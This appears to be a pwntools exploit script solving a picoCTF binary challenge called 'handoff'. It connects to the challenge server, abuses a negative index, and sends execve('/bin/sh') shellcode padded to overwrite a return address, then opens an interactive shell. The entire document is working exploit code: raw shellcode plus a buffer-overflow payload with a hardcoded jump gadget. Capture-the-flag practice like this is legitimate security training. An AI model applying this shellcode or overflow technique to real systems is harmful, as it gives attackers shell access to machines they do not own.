from pwn import *

elf = ELF("./handoff_patched")

context.binary = elf

# p = process()
# gdb.attach(p, "break *fgets+254")
p = remote("shape-facility.picoctf.net", 58918)

context.log_level = 'debug'
p.sendlineafter(b'app', b'2')
p.sendlineafter(b'?', b'-1')
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05".ljust(40, b'\xaa') + pack(0x00000000004011ae)
assert(all([char not in b' \n\t' for char in payload]))
p.sendlineafter(b'?', payload)

p.interactive()
